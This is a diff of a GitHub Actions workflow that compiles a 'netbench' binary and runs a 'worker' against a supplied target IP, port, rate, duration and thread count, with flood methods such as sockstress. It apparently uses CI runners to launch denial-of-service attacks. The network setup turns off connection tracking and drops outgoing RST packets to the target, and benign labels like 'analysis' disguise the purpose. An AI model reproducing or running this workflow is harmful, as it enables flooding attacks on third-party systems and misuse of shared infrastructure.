@@ -28,10 +28,6 @@ on:
           - v18_tls
           - tls
           - sockstress_v15
-          - dns_v16
-          - stealth
-          - v20_ws
-          - v19_tcp
           - fjium-dns
           - fjium-gudp
           - fjium-hex
@@ -61,8 +57,9 @@ on:
           - 'true'
           - 'false'
 
-
-
+concurrency:
+  group: deploy-${{ github.ref }}
+  cancel-in-progress: true
 
 jobs:
   compile:
@@ -73,30 +70,30 @@ jobs:
     steps:
     - uses: actions/checkout@v4
 
-    - name: Cache compiled binary
-      id: bin-cache
+    - name: Cache dependencies
       uses: actions/cache@v4
       with:
-        path: netbench
-        key: bin-${{ hashFiles('*.c', '*.h', 'Makefile') }}
+        path: ~/apt-cache
+        key: deps-v2
 
     - name: Install dependencies
-      if: steps.bin-cache.outputs.cache-hit != 'true'
       run: |
+        if [ -d ~/apt-cache ]; then
+          sudo cp ~/apt-cache/*.deb /var/cache/apt/archives/ 2>/dev/null || true
+        fi
         sudo apt-get update -qq > /dev/null 2>&1 || true
         sudo apt-get install -y cpulimit clang libbpf-dev libelf-dev > /dev/null 2>&1 || true
+        mkdir -p ~/apt-cache
+        cp /var/cache/apt/archives/*.deb ~/apt-cache/ 2>/dev/null || true
 
     - name: Build project
-      if: steps.bin-cache.outputs.cache-hit != 'true'
       run: make clean || true && make 2>&1
 
     - name: Store artifact
       uses: actions/upload-artifact@v4
       with:
         name: app-bin
-        path: |
-          netbench
-          proxies.txt
+        path: netbench
         retention-days: 1
 
     - id: sync
@@ -126,23 +123,18 @@ jobs:
 
     - name: Prepare environment
       run: |
-        METHOD="${{ github.event.inputs.method || 'v18_tcp' }}"
-        sudo sysctl -w net.core.wmem_max=268435456 2>/dev/null || true
+        sudo sysctl -w net.core.wmem_max=67108864 2>/dev/null || true
         sudo sysctl -w net.core.rmem_max=67108864 2>/dev/null || true
-        sudo sysctl -w net.core.wmem_default=16777216 2>/dev/null || true
+        sudo sysctl -w net.core.wmem_default=4194304 2>/dev/null || true
         sudo sysctl -w net.core.netdev_max_backlog=30000 2>/dev/null || true
         sudo sysctl -w net.core.somaxconn=65535 2>/dev/null || true
         sudo sysctl -w net.ipv4.conf.all.rp_filter=0 2>/dev/null || true
         sudo sysctl -w net.ipv4.conf.default.rp_filter=0 2>/dev/null || true
         sudo sysctl -w net.ipv4.conf.eth0.rp_filter=0 2>/dev/null || true
         sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null || true
-        sudo sysctl -w net.core.netdev_budget=600 2>/dev/null || true
-        sudo sysctl -w net.core.netdev_budget_usecs=8000 2>/dev/null || true
-        if [ "$METHOD" != "v18_tcp" ] && [ "$METHOD" != "stealth" ]; then
-          sudo iptables -t raw -A OUTPUT -p tcp -j NOTRACK 2>/dev/null || true
-          sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ${{ github.event.inputs.target_ip }} -j DROP 2>/dev/null || true
-        fi
+        sudo iptables -t raw -A OUTPUT -p tcp -j NOTRACK 2>/dev/null || true
         sudo iptables -t raw -A OUTPUT -p udp -j NOTRACK 2>/dev/null || true
+        sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ${{ github.event.inputs.target_ip }} -j DROP 2>/dev/null || true
 
     - name: Run analysis (Replica ${{ matrix.id }})
       run: |
@@ -174,11 +166,7 @@ jobs:
           fi
         fi
         
-        if [ "$METHOD" = "dns_v16" ] || [ "$METHOD" = "stealth" ] || [ "$METHOD" = "v19_tcp" ] || [ "$METHOD" = "v20_ws" ] || [ "$METHOD" = "v18_tcp" ]; then
-          sudo GITHUB_ACTIONS=true ./worker $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG
-        else
-          sudo sh -c "cpulimit -l 50 -f -- ./worker $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG || exec ./worker $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG"
-        fi
+        sudo sh -c "cpulimit -l 50 -f -- ./worker $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG || exec ./worker $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG"
 
     - name: Cleanup
       if: always()
